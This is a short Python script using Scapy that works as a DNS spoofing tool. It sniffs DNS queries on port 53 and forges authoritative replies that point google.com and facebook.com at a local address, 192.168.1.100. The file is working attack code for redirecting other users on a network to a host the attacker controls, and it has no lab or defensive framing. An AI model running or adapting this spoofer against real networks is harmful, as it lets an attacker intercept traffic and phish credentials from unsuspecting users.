import logging as log
from scapy.all import *

class DnsSpoof:
    def __init__(self, hostDict):
        self.hostDict = hostDict

    def __call__(self):
        log.info("Spoofing....")
        sniff(filter="udp and port 53", prn=self.callBack)

    def callBack(self, packet):
        if DNS in packet and DNSQR in packet:
            try:
                log.info(f'[original] {packet[DNSQR].qname}')
                queryName = packet[DNSQR].qname
                if queryName in self.hostDict:
                    spoofed_packet = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                                     UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                                     DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                                         an=DNSRR(rrname=queryName, rdata=self.hostDict[queryName]))
                    log.info(f'[modified] {spoofed_packet[DNSRR].summary()}')
                    send(spoofed_packet, verbose=0)
                else:
                    log.info(f'[not modified] {packet[DNSQR].qname}')
            except IndexError as error:
                log.error(error)

if __name__ == '__main__':
    try:
        hostDict = {
            b"google.com.": "192.168.1.100",
            b"facebook.com.": "192.168.1.100"
        }
        log.basicConfig(format='%(asctime)s - %(message)s', level=log.INFO)
        snoof = DnsSpoof(hostDict)
        snoof()
    except OSError as error:
        log.error(error)
